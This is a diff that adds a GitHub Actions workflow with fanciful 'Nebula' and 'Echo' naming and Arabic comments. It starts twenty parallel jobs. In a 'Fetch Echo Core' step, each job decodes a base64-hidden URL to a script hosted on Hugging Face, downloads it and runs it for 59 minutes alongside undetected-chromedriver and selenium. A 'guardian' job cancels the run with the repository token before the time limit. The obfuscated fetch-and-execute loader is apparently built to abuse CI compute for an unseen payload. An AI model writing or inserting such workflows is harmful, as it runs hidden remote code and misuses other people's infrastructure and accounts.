@@ -1,0 +1,103 @@
+name: Nebula Echo Guardian Weave
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: nebula-weave-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # الحارس الرئيسي: يثبت عند نقطة المراقبة 59 دقيقة ثم يُصدر أمر الإلغاء
+  # =================================================================
+  nebula-guardian:
+    name: "Nebula Guardian"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCH_INTERVAL: 3540
+    steps:
+      - name: Secure Watchpoint
+        run: |
+          echo "[GUARDIAN] Watchpoint secured for run: ${{ github.run_id }}"
+          echo "[GUARDIAN] Holding position for ${WATCH_INTERVAL} seconds (59-minute threshold)."
+
+          sleep "${WATCH_INTERVAL}"
+
+          echo "[GUARDIAN] Threshold reached — issuing cancel command."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[GUARDIAN] Cancel command issued. Active and queued flows will be dispersed."
+
+  # =================================================================
+  # شبكة الصدى المتوازية: تجهيز وتشغيل عُقد Echo
+  # =================================================================
+  echo-grid:
+    name: "EchoNode-${{ matrix.node_id }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [3301, 3302, 3303, 3304, 3305, 3306, 3307, 3308, 3309, 3310, 3311, 3312, 3313, 3314, 3315, 3316, 3317, 3318, 3319, 3320]
+
+    steps:
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟴ المرحلة «أ»: تجهيز طبقة الانطلاق
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Prepare Foundation
+        run: |
+          echo "[FOUNDATION] Preparing foundation for EchoNode-${{ matrix.node_id }} on Linux..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟴ المرحلة «ب»: جلب نواة Echo
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Fetch Echo Core
+        run: |
+          echo "[FETCH] Fetching echo core from designated source..."
+          CORE_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$CORE_URL" -o echo_core.py
+          echo "[FETCH] Echo core acquired."
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟴ المرحلة «ج»: تثبيت المكتبات المساندة
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Install Auxiliary Libraries
+        run: |
+          echo "[LIBS] Installing auxiliary libraries..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      # ⟴ المرحلة «د»: إطلاق دورة Echo لمدة 59 دقيقة
+      # ◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆◆
+      - name: Launch Echo Cycle
+        run: |
+          echo ">> Launching EchoNode-${{ matrix.node_id }} cycle..."
+
+          python3 echo_core.py &
+          CYCLE_PID=$!
+
+          echo ">> Cycle launched. Duration cap: 59 minutes (3540s)."
+
+          sleep 3540
+
+          if kill -0 "$CYCLE_PID" 2>/dev/null; then
+            echo ">> Duration cap reached — terminating cycle."
+            kill -9 "$CYCLE_PID"
+            echo ">> Cycle terminated by duration keeper."
+          else
+            echo ">> Cycle completed before duration cap."
+          fi
